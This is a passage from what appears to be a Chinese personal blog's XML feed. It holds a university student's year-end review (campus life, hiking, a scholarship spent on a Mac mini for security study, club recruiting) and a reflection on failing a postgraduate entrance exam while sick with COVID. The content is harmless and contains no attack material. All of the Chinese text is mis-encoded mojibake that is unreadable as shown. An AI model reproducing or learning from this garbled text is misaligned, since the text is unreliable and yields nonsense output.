æ¬¡ï¼Œä¸€èµ·çˆ¬äº†è¥¿å±±å…¬å›­ï¼Œä¹°äº†é¦’å¤´å–‚äº†é±¼ï¼Œæ„Ÿå—äº†ä¸€ä¸‹æ¡‚æ—çš„æ…¢èŠ‚å¥è€å¹´å…»ç”Ÿç”Ÿæ´»ï¼Œè¿˜ä¸€èµ·å»åƒäº†çƒ¤è‚‰ï¼Œæœ‰è¯´æœ‰ç¬‘éå¸¸å¼€å¿ƒã€‚</p><p>çœ‹ç€å…¬å›­é‡Œæ™¨ç»ƒçš„ã€å–‚é±¼çš„ã€ä¸‹æ£‹çš„ã€å” å—‘çš„ã€æ•£æ­¥è·‘æ­¥çš„è€äººï¼Œæˆ‘æƒ³äº†å¾ˆä¹…å…³äºæœªæ¥çš„è§„åˆ’ï¼Œæƒ³æ¥æƒ³å»ä¹Ÿæ²¡æƒ³å‡ºä¸ªæ‰€ä»¥ç„¶ï¼Œä»¥å‰å¤§ä¸€åˆšè¿›æ¥çš„æ—¶å€™éå¸¸æƒ³å»ä¸Šç­ï¼Œåˆ°å¤§ä¸‰åˆå˜æˆéå¸¸ä¸æƒ³å»ä¸Šç­ï¼Œæ„Ÿè§‰æ¯ä¸ªé˜¶æ®µä¼šæœ‰æ¯ä¸ªé˜¶æ®µçš„æƒ³æ³•ï¼Œè¿™ä¸ªé˜¶æ®µé‡Œç»å†çš„æ‰€æœ‰äº‹æƒ…éƒ½ä¼šå½±å“è‡ªå·±æœªæ¥çš„çœ‹æ³•ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦å†åŠªåŠ›ä¸€ç‚¹ï¼Œæå‡è‡ªå·±çš„å®åŠ›ï¼Œç»™æœªæ¥çš„è‡ªå·±åœ¨äººç”Ÿçš„é“è·¯ä¸Šå¤šä¸€ç‚¹é€‰æ‹©ç©ºé—´ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112030233712.png" alt="è€å‹èšé¤"></p><h1 id="å¤§ä¸‰ä¸‹"><a href="#å¤§ä¸‰ä¸‹" class="headerlink" title="å¤§ä¸‰ä¸‹"></a>å¤§ä¸‰ä¸‹</h1><h2 id="ç„•ç„¶ä¸€æ–°"><a href="#ç„•ç„¶ä¸€æ–°" class="headerlink" title="ç„•ç„¶ä¸€æ–°"></a>ç„•ç„¶ä¸€æ–°</h2><p>å›åˆ°å­¦æ ¡ä»¥åæ­£å€¼å¤šé›¨æ½®æ¹¿çš„æ˜¥å­£ï¼Œæ‰«åœ°åƒ§å­¦é•¿æäº†ä¸ªå¸ç¯·å›æ¥ï¼Œéå¸¸æ¸©é¦¨ï¼Œååˆ†èˆ’é€‚ã€‚</p><p>åä¼šè¿™å¼ åºŠå«é™ªæˆ‘åº¦è¿‡äº†æ•°ä¸æ¸…å¤šå°‘ä¸ªå¥‹æ–—çš„ã€å¤±çœ çš„ã€æ‘†çƒ‚çš„å¤œæ™šï¼Œå¤§ä¸€å¤§äºŒè‡ªå·±ä¸€ç›´å¾ˆç‹¬å¾ˆç¿˜ï¼ŒæŠŠç¤¾å›¢å½“å®¶ï¼Œé€ƒé¿å¤„ç†å®¿èˆå…³ç³»åŠ ä¸Šé˜´é—´ä¸€æ ·çš„ä½œæ¯è®©æˆ‘åœ¨è·Ÿè¿™å¼ åºŠå«åšäº†ä¸¤å¹´çš„ä¼´ï¼Œå¤§ä¸‰æœ‰æœºä¼šæ¢åˆ°ä¸‰é™¢çš„å®¿èˆï¼Œè®¤è¯†äº†å®¶äººä¸€æ ·çš„èˆå‹ï¼Œæˆ‘æ‰æ…¢æ…¢çš„èµ°å‡ºè¿™ç‰‡å±äºæˆ‘è‡ªå·±çš„å°å¤©åœ°ã€‚</p><p>ä¸å¥¢æ±‚åºŠå«çš„æœ¬ä½“èƒ½å¤Ÿä»£ä»£ç›¸ä¼ ï¼Œä½†æ˜¯å¸Œæœ›å®ˆå¤œäººç²¾ç¥èƒ½å¤Ÿä¼ æ‰¿ä¸‹å»ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112030311871.png" alt="æ¸©é¦¨"></p><h2 id="ç¹èŠ±ä¼¼é”¦"><a href="#ç¹èŠ±ä¼¼é”¦" class="headerlink" title="ç¹èŠ±ä¼¼é”¦"></a>ç¹èŠ±ä¼¼é”¦</h2><p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»¥å‰ä¸å¤ªå…³æ³¨æ ¡å›­ï¼Œæ„Ÿè§‰ä»Šå¹´çš„èŠ±å¼€çš„æ ¼å¤–å¥½çœ‹ï¼Œé…ä¸Šæ¡‚ç”µå››é¢ç¯å±±çš„åœ°ç†ä½ç½®å’Œæ˜¥å­£å¤šé›¾çš„å¤©æ°”ï¼Œå°±éå¸¸çš„è¯—æƒ…ç”»æ„ï¼Œå¾ˆæœ‰æ„Ÿè§‰ï¼Œç”¨ç¾ä¸èƒœæ”¶æ¥å½¢å®¹ä¸€ç‚¹ä¹Ÿä¸ä¸ºè¿‡ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220410_130437.jpg" alt="èŠ±"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220413_075156.jpg" alt="æ¥¼ä¸‹çš„èŠ±"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220413_090002.jpg" alt="å¥½çœ‹"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220413_090646.jpg" alt="çˆ±å¿ƒ"></p><h2 id="çˆ¬å å½©å±±"><a href="#çˆ¬å å½©å±±" class="headerlink" title="çˆ¬å å½©å±±"></a>çˆ¬å å½©å±±</h2><p>åŠ³åŠ¨èŠ‚çš„æ—¶å€™è·Ÿç ”å‹å»çˆ¬äº†å å½©å±±ï¼Œæœ‰ç‚¹ç´¯ï¼Œä½†æ˜¯ç™»é«˜æœ›è¿œè¿˜æ˜¯å¾ˆèƒ½è§£å‹çš„ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112031508314.png" alt="å å½©å±±"></p><h2 id="å­¤ç‹¬ç¬¬å››çº§"><a href="#å­¤ç‹¬ç¬¬å››çº§" class="headerlink" title="å­¤ç‹¬ç¬¬å››çº§"></a>å­¤ç‹¬ç¬¬å››çº§</h2><p>åŠ³åŠ¨èŠ‚çš„å°¾å·´ï¼Œæƒ³èµ·å¾ˆä¹…æ²¡å»ç”µå½±é™¢çœ‹ç”µå½±äº†ï¼Œè‡ªå·±ä¸€ä¸ªäººè·‘å»çœ‹äº†ã€Šæˆ‘æ˜¯çœŸçš„è®¨åŒå¼‚åœ°æ‹ã€‹ï¼Œä¹°çš„æ˜¯æœ€åä¸€æ’ã€‚</p><p>å‰§æƒ…ä¸å¤ªè®°å¾—æ¸…äº†ï¼Œä½†æ˜¯è¿˜æ˜¯å¸Œæœ›è‡ªå·±æœªæ¥èƒ½æœ‰è°ˆå¼‚åœ°æ‹çš„å‹‡æ°”å’Œç»ˆç»“å¼‚åœ°æ‹çš„èƒ½åŠ›ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112032337764.png" alt="å¼‚åœ°æ‹"></p><h2 id="å¥–å­¦é‡‘-å¥½å­¦é•¿-x3D-x3D-Mac"><a href="#å¥–å­¦é‡‘-å¥½å­¦é•¿-x3D-x3D-Mac" class="headerlink" title="å¥–å­¦é‡‘ + å¥½å­¦é•¿ &#x3D;&#x3D; Mac"></a>å¥–å­¦é‡‘ + å¥½å­¦é•¿ &#x3D;&#x3D; Mac</h2><p>å¾—ç›Šäºå­¦æ ¡å¥–å­¦é‡‘è·Ÿä½“è‚²æŒ‚é’©çš„æ”¿ç­–ï¼Œå¯¼è‡´æˆ‘å››å¹´ä¼˜ç§€çš„å­¦åˆ†ç»©æ²¡å‘æŒ¥å‡ºä»»ä½•ä½œç”¨ã€‚æœ¬ä»¥ä¸ºå°±æ­¤è·Ÿå¥–å­¦é‡‘å†æ— ç¼˜åˆ†ï¼Œè·Ÿå­¦é™¢åˆä½œçš„ä¼ä¸šæ¥å¼„äº†ä¸ªä¸éœ€è¦çœ‹ä½“è‚²&#x2F;ä½“æµ‹æˆç»©çš„å¥–å­¦é‡‘ï¼Œç¨³ç¨³æ‹¿ä¸‹ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112111621787.png" alt="3k"></p><p>éšåè·Ÿæˆ‘çš„æ‘‡é’±ç„•å€Ÿäº†ç‚¹ï¼Œæ‹¼æ‹¼å‡‘å‡‘ï¼Œä¹ä¹ä¸ä¸çš„åœ¨é—²é±¼è°ˆä¸‹äº†ä¸€å° 99æ–°çš„ï¼Œåœ¨ä¿åŠå¹´çš„ï¼Œ16g è¿è¡Œå†…å­˜çš„ï¼Œ512g å­˜å‚¨å†…å­˜çš„ Mac miniï¼Œè¿ˆå‡ºäº†ç¬¬é›¶æ­¥ï¼Œåªå¯æƒœä»Šå¹´æ²¡æœ‰å¤ªå¤šæ—¶é—´ç”¨å®ƒæ¥å­¦ä¹ å®‰å…¨æŠ€æœ¯ï¼Œ23 å¹´ä¸€å®šè¦æ´¾ä¸Šç”¨åœºï¼Œå›å½’ä¹°å®ƒçš„åˆå¿ƒã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112025457711.png" alt="mac mini"></p><p>æœ€åç‰¹åˆ«æ„Ÿè°¢æˆ‘çš„æ‰«åœ°åƒ§å¸ˆå‚…ï¼Œè¿™ä¸‰å¹´æ¥åœ¨å­¦ä¹ ã€ç”Ÿæ´»å’Œç»æµä¸Šç»™äºˆäº†æˆ‘è«å¤§çš„å¸®åŠ©ï¼Œæ¯ä¸€æ¬¡éƒ½æ˜¯é›ªä¸­é€ç¢³ï¼Œé¥¿æ—¶é€é¥­ï¼Œåœ¨æˆ‘è¿·èŒ«æ—¶ä¼šç»™æˆ‘æŒ‡ç‚¹è¿·æ´¥ï¼Œå¸Œæœ›ä»–æœªæ¥é¡ºé£é¡ºæ°´ï¼Œçˆ±æƒ…äº‹ä¸šåŒä¸°æ”¶ã€‚</p><h2 id="æ‹¼ç§¯æœ¨"><a href="#æ‹¼ç§¯æœ¨" class="headerlink" title="æ‹¼ç§¯æœ¨"></a>æ‹¼ç§¯æœ¨</h2><p>å¿ƒè¡€æ¥æ½®ä¹°äº†ä¸ªç§¯æœ¨å›æ¥æ‹¼ï¼Œä»åˆ†ç±»åˆ°æ‹¼è£…ï¼Œä¸¤å£æ°”æ‹¼äº†å¤§æ¦‚ 13 ä¸ªå°æ—¶ã€‚æƒ³ç€ç£¨ç»ƒäº†ä¸€ä¸‹è‡ªå·±çš„å®šåŠ›ï¼Œæé«˜ä¸€ä¸‹è‡ªå·±çš„ä¸“æ³¨åŠ›ï¼Œä¸è¿‡ä¹Ÿå¯èƒ½æ˜¯æ‹¼ç§¯æœ¨è¿™ä»¶äº‹æ¯”è¾ƒè®©äººç€è¿·ï¼Œä¸€å¼€å§‹æ‹¼å°±æƒ³ä¸€æ¬¡æ€§æ‹¼å®Œã€‚</p><p>æ‹¼å®Œä»¥åçœ‹ç€æˆå“çœŸçš„æ˜¯æˆå°±æ„Ÿæ»¡æ»¡ï¼Œä»Šåæœ‰æœºä¼šå†ä¹°ç‚¹æœ‰æ„æ€çš„ç§¯æœ¨å›æ¥æ‹¼ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220622_205434.jpg" alt="åˆ†ç±»"></p><p>å¡äº†ä¸ªæˆ’æŒ‡è¿›å»ï¼Œä¸çŸ¥é“å½“æ—¶è„‘å­æŠ½ä»€ä¹ˆé£ï¼Œè§‰å¾—è¿™æ ·åšå¾ˆæµªæ¼«ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112112611712.png" alt="æˆ’æŒ‡"></p><p>æˆå“éå¸¸å¥½çœ‹ï¼Œæ‘†åœ¨æ¡Œä¸Šååˆ†æœ‰æ’é¢ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220624_212120.jpg" alt="æˆå“1"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220624_212136.jpg" alt="æˆå“2"></p><h1 id="æš‘å‡"><a href="#æš‘å‡" class="headerlink" title="æš‘å‡"></a>æš‘å‡</h1><p>æš‘å‡è€è€å®å®åœ¨å­¦æ ¡å¤ä¹ è€ƒç ”ï¼Œæ²¡æœ‰ä»€ä¹ˆå°è±¡æ·±åˆ»çš„äº‹æƒ…ã€‚</p><h1 id="å¤§å››ä¸Š"><a href="#å¤§å››ä¸Š" class="headerlink" title="å¤§å››ä¸Š"></a>å¤§å››ä¸Š</h1><h2 id="æ‹›æ–°"><a href="#æ‹›æ–°" class="headerlink" title="æ‹›æ–°"></a>æ‹›æ–°</h2><p>ä»Šå¹´å»çœ‹äº†çœ‹é¢è¯•ï¼Œæ„Ÿè§‰ç°åœ¨å¹´è½»äººè¶Šæ¥è¶Šå–œæ¬¢æ‘†çƒ‚äº†ã€‚</p><p>ä»Šå¹´ä¾æ—§æ˜¯æ‹›åˆ°äº†ä¸¤ä¸ªå­¦å¦¹ä¸‰ä¸ªå­¦å¼Ÿï¼Œæ„Ÿè§‰éƒ½æŒºèªæ˜æŒºæœ‰æ½œåŠ›çš„ï¼Œå¸Œæœ›èƒ½å¥½å¥½å­¦å¥½å¥½å¹²ï¼Œä¸è¦å¤ªè…¼è…†ï¼Œå¤šè·Ÿå­¦é•¿å­¦å§äº¤æµã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E6%88%91%E5%8F%AF%E4%BB%A5.jpg" alt="æˆ‘å¯ä»¥"></p><h2 id="å¹²é¥­æ—¶å…‰"><a href="#å¹²é¥­æ—¶å…‰" class="headerlink" title="å¹²é¥­æ—¶å…‰"></a>å¹²é¥­æ—¶å…‰</h2><p>å¤§å››ä¸Šå› ä¸ºç–«æƒ…å’Œè€ƒç ”è¿‡çš„æ¯”è¾ƒå¹³æ·¡ï¼Œæ¯”è¾ƒæœ‰æ„ä¹‰çš„äº‹æƒ…ä¸€ä¸ªæ˜¯è€ƒç ”ï¼Œç¬¬äºŒä¸ªæ˜¯å¹²é¥­ã€‚è¿™ä¸ªå­¦æœŸè·Ÿç¤¾å›¢çš„å­¦å¼Ÿå­¦å¦¹ä¸€èµ·åƒäº†è›®å¤šé¡¿é¥­ï¼Œä½œä¸ºä¸€ä¸ªå¤§å››è€ä¸œè¥¿ï¼Œåœ¨ç–«æƒ…å°æ§æ—¶æœŸå¤§å®¶ç²¾ç¥çŠ¶æ€éƒ½ä¸å¤ªå¦™ï¼Œèƒ½æœ‰è¿™ç§å…„å‹å¼Ÿæ­ï¼Œä¸å­¦å¼Ÿå­¦å¦¹å…±äº«å¤©ä¼¦ä¹‹ä¹çš„æ—¶å…‰ä¿¨ç„¶å€¼å¾—æˆ‘å¥½å¥½çæƒœä¸æ€€å¿µã€‚</p><p>ä»Šå¹´è¿˜å–œæ¬¢ä¸Šäº†å–å¨å£«å¿Œï¼Œç®€ç®€å•å•çš„å¨å£«å¿ŒåŠ å†°éå¸¸æœ‰é£å‘³ï¼Œå¸Œæœ›æœ‰æ—¶é—´èƒ½å­¦å­¦è°ƒé…’ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E6%95%B4%E7%82%B9.jpg" alt="æ•´ç‚¹"></p><h2 id="è€ƒç ”å¤±åˆ©"><a href="#è€ƒç ”å¤±åˆ©" class="headerlink" title="è€ƒç ”å¤±åˆ©"></a>è€ƒç ”å¤±åˆ©</h2><p>ç²—ç•¥çš„æ¥è¯´å°±æ˜¯ï¼šè¸©äº†å¾ˆå¤šå‘ + è€ƒå‰é˜³äº† â€”â€”&gt; å¤±è´¥ã€‚è¯¦æƒ…å¯ä»¥çœ‹å¦ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://c1everf0x.top/posts/17836/">è€ƒç ”ä¸€æˆ˜å¤±è´¥çš„åæ€ä¸æ€»ç»“</a></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E4%B8%8D%E4%BA%89%E6%B0%94.jpg" alt="ä¸äº‰æ°”"></p><p>è€ƒå‰å­¦é™¢é€äº†åŠ æ²¹åŒ…ï¼Œè›®æ„ŸåŠ¨çš„ï¼Œåªå¯æƒœä»Šå¹´ä¸äº‰æ°”ï¼Œå‘½ä¹Ÿä¸å¥½ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112041631319.png" alt="åŠ æ²¹åŒ…"></p><p>å§šè€å¸ˆä¹Ÿåœ¨è€ƒå‰é€äº†æ©™å­ï¼Œä»Šå¹´æ²¡èƒ½é©¬åˆ°ğŸŠåŠŸï¼Œå¸Œæœ› 2023 å¹´äºŒæˆ˜èƒ½å¤Ÿå¤§å™¨æ™šğŸŠã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%A4%A7%E5%99%A8%E6%99%9A%E6%88%90.jpeg" alt="å¤§å™¨æ™šæˆ"></p>]]></content>
      
      
      <categories>
          
          <category> å¹´ç»ˆæ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¹´ç»ˆæ€»ç»“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ä»0åˆ°0.1</title>
      <link href="/posts/35239/"/>
      <url>/posts/35239/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è€ƒç ”ä¸€æˆ˜å¤±è´¥çš„åæ€ä¸æ€»ç»“</title>
      <link href="/posts/17836/"/>
      <url>/posts/17836/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>12.23 æ™š 10 ç‚¹ï¼ŒåšæŒåˆ°äº†è¿™é‡Œä¹Ÿç®—èµ°å®Œäº†ä¸€æˆ˜å…¨éƒ¨çš„æµç¨‹ã€‚</p><p>æ˜å¤©å°±è¦é¢å¯¹ä¸€åœºæ—©å·²çŸ¥é“ç»“æœçš„è€ƒè¯•ï¼Œæ²¡æœ‰æƒ³è¿‡å¼ƒè€ƒï¼Œä¹Ÿæ²¡æœ‰åšä¸€äº›å‡åŠªåŠ›æ¥è‡ªå·±éª—è‡ªå·±ã€‚</p><p>æƒ³æ¥æƒ³å»è¿˜æ˜¯ä¸æƒ³å¼ƒè€ƒï¼Œæ„Ÿè§‰ä¸å¦‚å¦ç„¶é¢å¯¹ï¼Œå“ªæ€•ä»Šå¹´ç™¾åˆ†ä¹‹ä¸€ä¸‡è€ƒä¸ä¸Šï¼Œå“ªæ€•å·²ç»ä¸‹å®šå†³å¿ƒå»äºŒæˆ˜äº†ï¼Œå“ªæ€•é¡¶ç€è€ƒå®Œå˜é˜³çš„é£é™©ï¼Œæˆ‘ä¹Ÿä¼šèµ°è¿›è€ƒåœºåšå®Œå››å¼ å·å­ï¼Œè¿™ä¸ä»…æ˜¯æˆ‘èƒ½åŠ›çš„å±•ç°ï¼Œä¹Ÿæ˜¯æˆ‘é¢å¯¹æŒ‘æˆ˜çš„æ€åº¦ã€‚</p></blockquote><blockquote><p>12.24 æ™š 9 ç‚¹</p><p>ä»Šå¤©è€ƒçš„æ”¿æ²»è®©æˆ‘æ„Ÿè§‰è‚–1000ç™½åˆ·äº†ï¼ŒåŸºæœ¬æ²¡å‡ é¢˜è§è¿‡çš„ï¼Œé€‰æ‹©é¢˜å·¨éš¾ã€‚å¤§é¢˜æ„Ÿè§‰è‚–4æ²¡å‹åˆ°ï¼Œä¸Šå¾®åšçœ‹çœ‹è‚–è€çš„å¾®åšï¼Œå¥½åƒå¤§å®¶éƒ½è¯´è‚–4çš„ç¬¬å››å¥—å‹åˆ°äº†ï¼Œå¯æƒœæˆ‘åªèƒŒäº†å‰ä¸¤å¥—ï¼Œçœ‹äº†çœ‹ç¬¬ä¸‰å¥—çš„ç­”æ¡ˆï¼Œå“­ï¼</p><p>è‹±è¯­æ„Ÿè§‰ä¹Ÿæ˜¯ç‰¹åˆ«éš¾ï¼Œç¬¬ä¸‰ç¯‡åŠæ‡‚ï¼Œç¬¬å››ç¯‡å®Œå…¨çœ‹ä¸æ‡‚ï¼Œæ„Ÿè§‰è·Ÿ 10 å¹´çš„å·®ä¸å¤šéš¾äº†ï¼Œé˜…è¯»æŠ€å·§æ„Ÿè§‰éƒ½ç”¨ä¸ä¸Šï¼Œæ¯”è¾ƒå¥½çš„æ˜¯å¤§å°ä½œæ–‡è¿˜æ˜¯è‹±ä¸€å¸¸è§„è€ƒçš„ï¼Œç›´æ¥ç”¨Monkeyçš„æ¨¡æ¿ç§’äº†ã€‚</p></blockquote><blockquote><p>12.25 æ™š 11 ç‚¹</p><p>é˜³äº†ï¼Œå‘çƒ§åˆå¤´æ™•ï¼Œè¿™ä¸‹å½»åº•å¯„äº†ã€‚</p><p>è€ƒæ•°å­¦çš„æ—¶å€™ä¼°è®¡ä½çƒ§ï¼Œä½†æ˜¯å¤´å¾ˆæ™•ï¼Œæœ‰ç‚¹å¤´é‡è„šè½»çš„æ„Ÿè§‰ï¼Œåœ¨è€ƒåœºé‡Œé¢å†æˆ´ä¸ªn95ï¼Œè„‘å­è·Ÿå µæ­»äº†ä¸€æ ·ï¼Œä¸€ç‚¹æ€è·¯éƒ½æ²¡æœ‰ï¼Œæƒ³é¢˜æƒ³çš„å¾ˆæ…¢ã€‚</p><p>è€ƒ 408 çš„æ—¶å€™é«˜çƒ§ï¼Œå®Œå…¨æ²¡åŠæ³•åšé¢˜ï¼ŒåšæŒè¿›äº†è€ƒåœºï¼Œæå‰åŠå°æ—¶äº¤å·ï¼Œè®¤äº†ï¼Œå¯èƒ½æ˜¯å‘½ä¸å¥½å§ã€‚</p><blockquote><p>23 è€ƒç ”å®£å‘Šç»“æŸï¼Œæœ‰ç‚¹ä¸ç”˜å¿ƒï¼Œæœ€æœ‰ä¿¡å¿ƒçš„æ•°å­¦å’Œ 408 å› ä¸ºç”Ÿç—…æ²¡æœ‰è€ƒå‡ºçœŸå®æ°´å¹³ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%A4%A7%E5%99%A8%E6%99%9A%E6%88%90.jpeg" alt="å¤§å™¨æ™šæˆ"></p></blockquote></blockquote><blockquote><p>12.26 ä¸‹åˆ 3 ç‚¹</p><p>åœ¨å®éªŒå®¤é¡¶ç€ç–²æƒ«æ”¶æ‹¾å®Œä¹¦å’Œè®¾å¤‡ï¼Œæ²¡æœ‰ä½“æ¸©è®¡ï¼Œæ„Ÿè§‰è‡³å°‘ 39 åº¦ï¼Œè¶´åœ¨æ¡Œå­ä¸Šæ„Ÿè§‰å‘¼å¸æœ‰ç‚¹å›°éš¾ï¼Œå¤´æ¯”æ˜¨å¤©è€ƒè¯•çš„æ—¶å€™è¿˜è¦æ™•ï¼Œä¼°è®¡æ˜¯è¡€æ°§ä¸å¤ªå¤Ÿï¼Œä¸è¿‡ä¹Ÿæ²¡éš¾å—å¤ªä¹…ã€‚</p><p>12.26 æ™š 7 ç‚¹</p><p>æ‰›ç€ 39.5 åº¦ï¼Œå›åˆ°å®¶åƒå®Œé¥­ï¼Œçˆ¸å¦ˆä¹Ÿæ²¡é—®è€ƒç ”è€ƒçš„æ€ä¹ˆæ ·ï¼Œç»™æˆ‘æ‹¿äº†å¾ˆå¤šè¯åƒï¼Œç„¶åç›´æ¥ä¸ŠåºŠç¡è§‰äº†ã€‚</p></blockquote><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ç®—æ˜¯æ¯”è¾ƒé—æ†¾çš„ä¸€æ¬¡è€ƒç ”ï¼Œåœ¨è¿™æ ·çš„å¤§ç¯å¢ƒä¸‹è‚¯å®šä¸èƒ½å…¨æ€ªç–«æƒ…ï¼Œä½†æ˜¯è€ƒæ•°å­¦å’Œ 408 çš„æ—¶å€™å‘çƒ§ç¡®å®æ˜¯æŠ¹æ€äº†ä¸Šå²¸çš„æœ€åä¸€ç‚¹å¯èƒ½æ€§ã€‚</p><p>å¤–éƒ¨åŸå› æƒ³äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰å¯¹æˆ‘å½±å“æœ€å¤§çš„å€’ä¹Ÿä¸æ˜¯ğŸäº†ï¼Œå¯èƒ½æ˜¯ 5ã€6 æœˆé‚£æ—¶å€™å› ä¸ºä¸“ä¸šçš„è¯¾ç¨‹å®‰æ’å¯¼è‡´å¤ä¹ èŠ‚å¥çš„æ–­æ¡£ï¼Œè¿›è€ŒæŠŠæœ€å¥½çš„çŠ¶æ€æä¸¢äº†ï¼Œä¹‹åæ— è®ºæ€ä¹ˆè°ƒæ•´éƒ½è°ƒæ•´ä¸å›æ¥ã€‚å…¶æ¬¡å°±æ˜¯æš‘å‡å¤ä¹ ç¯å¢ƒå˜æ¥å˜å»ï¼Œåˆç ´åäº†å¤ä¹ çŠ¶æ€ï¼Œå¯¼è‡´å¼ºåŒ–é˜¶æ®µå¤ä¹ æ•ˆæœä¸å¥½ï¼Œè´è¶æ•ˆåº”åˆæ‹–äº†æœ€ååˆ·çœŸé¢˜å†²åˆºé˜¶æ®µçš„åè…¿ã€‚æœ€åæ‰æ˜¯å‘çƒ§ã€‚</p><p><strong>ä½†æ˜¯æœ€ä¸»è¦çš„è¿˜æ˜¯ä¸ªäººåŸå› ã€‚</strong></p><ol><li>ä¸å¤Ÿçº¯ç²¹ï¼Œæ²¡èƒ½é™ä¸‹å¿ƒï¼šå›æƒ³äº†ä¸€ä¸‹ï¼Œä» 3 æœˆä»½å¼€å§‹å¤‡è€ƒï¼Œå¼€å¤´ä¸‰ä¸ªæœˆæ˜¯æˆ‘æ•´ä¸ªè€ƒç ”æœ€å¥½çš„çŠ¶æ€ï¼Œé‚£æ—¶å€™çœŸçš„æ„Ÿè§‰å­¦ä»€ä¹ˆéƒ½å­¦çš„åˆå¿«åˆå¥½ï¼Œä¹‹åå› ä¸ºä¸å¤Ÿçº¯ç²¹ï¼Œè€æ˜¯è¢«è¯¾ç¨‹ã€ç¯å¢ƒå½±å“ï¼Œå†ä¹Ÿæ²¡èƒ½é™ä¸‹å¿ƒæ¥ï¼Œä¹‹åæ— è®ºæ€ä¹ˆæ ·è°ƒæ•´ï¼Œä¹Ÿå†ä¹Ÿæ²¡èƒ½å›åˆ°æœ€å¥½çš„è¿™ä¸ªçŠ¶æ€ã€‚</li><li>å¤ä¹ ç­–ç•¥æœ‰é—®é¢˜ï¼šè‹±è¯­è¿‡äºè¿½æ±‚é˜…è¯»æŠ€å·§ï¼Œå¿˜è®°äº†å•è¯æ‰æ˜¯é˜…è¯»ä¹‹æœ¬ï¼›æ”¿æ²»æŠ±æœ‰ä¾¥å¹¸å¿ƒç†ï¼›æ•°å­¦åœ¨å¼ºåŒ–é˜¶æ®µâ€œé‡è¯¾è½»é¢˜â€ï¼Œåˆ·é¢˜é‡ä¸è¶³å¯¼è‡´æœ€ååšçœŸé¢˜çš„æ—¶å€™ç£•ç£•ç»Šç»Šï¼Œè®¡ç®—èƒ½åŠ›ä¹Ÿä¸å¤Ÿï¼›408 å­¦çš„æ²¡å¿˜çš„å¿«ï¼Œä¸Šè€ƒåœºæœ‰äº›ä¸é‚£ä¹ˆåçš„è€ƒç‚¹ä¹Ÿæ²¡æœ‰åšå‡ºæ¥ã€‚</li><li>è§„åˆ’ä¸å¤Ÿåˆç†ï¼šåªåšäº†ç²—ç•¥çš„é•¿æœŸè§„åˆ’ï¼Œæ²¡æœ‰æŠŠé•¿æœŸä»»åŠ¡åŒ–å°åˆ°æ¯ä¸€å¤©ï¼Œå¯¼è‡´æ¯ä¸ªé˜¶æ®µæœ«éƒ½æ˜¯åœ¨èµ¶è¿›åº¦çš„å­¦ä¹ ï¼Œæ•ˆæœéå¸¸ä¸å¥½ã€‚</li><li>å¿ƒæ€å·®ï¼šæŠ¥åå®Œåè€æ˜¯çœ‹æŠ¥è€ƒå­¦æ ¡çš„è€ƒç ”ç¾¤ï¼Œè¢«çœŸçœŸå‡å‡çš„ä¿¡æ¯å“åˆ°äº†ï¼Œå½±å“äº†çŠ¶æ€ï¼Œåœæ‘†äº†å¥½å‡ å¤©ã€‚</li></ol><h1 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h1><p>å¦‚æœæƒ³è€ƒ 11408 çš„ 985ï¼ŒçœŸçš„å¾ˆéš¾ï¼Œè¿™ä¸ªéš¾ä¸æ˜¯æ•°å­¦éš¾ä¹Ÿä¸æ˜¯ 408 è¿™äº›çŸ¥è¯†ä¸Šçš„éš¾ï¼Œæ˜¯éš¾åœ¨æ¯ä¸€ä¸ªé˜¶æ®µéƒ½ä¸èƒ½å‡ºé”™ï¼Œéœ€è¦æ¯ä¸€ä¸ªå¤ä¹ é˜¶æ®µæœ‰æ¯”è¾ƒå¥½çš„çŠ¶æ€ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªé˜¶æ®µæ•ˆæœä¸å¥½ï¼Œå°±ä¼šäº§ç”Ÿè´è¶æ•ˆåº”ï¼Œå¯¹æœ€åçš„æˆç»©é€ 